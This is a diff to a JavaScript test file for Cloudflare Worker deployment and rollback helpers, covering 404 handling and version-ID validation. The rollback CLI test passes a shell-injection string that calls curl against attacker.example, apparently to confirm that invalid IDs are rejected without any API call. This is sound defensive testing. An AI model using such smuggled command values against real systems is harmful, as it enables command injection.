@@ -30,10 +30,10 @@ describe("getLatestDeploymentVersionId", () => {
 });
 
 describe("isWorkerScriptNotFound", () => {
-  it("detects HTTP 404", () => {
+  it("does not treat a bare HTTP 404 as script not found", () => {
     assert.equal(
       isWorkerScriptNotFound({ status: 404, statusText: "Not Found" }, { success: false }),
-      true,
+      false,
     );
   });
 
@@ -69,7 +69,7 @@ describe("listWorkerDeployments", () => {
       statusText: "Not Found",
       json: async () => ({
         success: false,
-        errors: [{ message: "Script not found" }],
+        errors: [{ message: "Script not found", code: 10007 }],
       }),
     });
     const result = await listWorkerDeployments("acct", "new-worker", "token", { fetchImpl });
@@ -89,6 +89,22 @@ describe("listWorkerDeployments", () => {
     await assert.rejects(
       () => listWorkerDeployments("acct", "worker", "token", { fetchImpl }),
       /List deployments failed: Authentication error/,
+    );
+  });
+
+  it("throws on HTTP 404 without a script-not-found signal", async () => {
+    const fetchImpl = async () => ({
+      ok: false,
+      status: 404,
+      statusText: "Not Found",
+      json: async () => ({
+        success: false,
+        errors: [{ message: "Account not found" }],
+      }),
+    });
+    await assert.rejects(
+      () => listWorkerDeployments("acct", "worker", "token", { fetchImpl }),
+      /List deployments failed: Account not found/,
     );
   });
 });
@@ -112,9 +128,14 @@ describe("assertValidWorkerVersionId", () => {
 
 describe("runRollbackCli", () => {
   it("returns 1 without calling the API when the version ID is invalid", async () => {
-    const code = await runRollbackCli([
-      'evil"; curl attacker.example; echo "',
-    ]);
+    const fetchImpl = async () => {
+      throw new Error("fetch must not be called for invalid version IDs");
+    };
+    const code = await runRollbackCli(['evil"; curl attacker.example; echo "'], {
+      accountId: "acct",
+      apiToken: "token",
+      fetchImpl,
+    });
     assert.equal(code, 1);
   });
 });
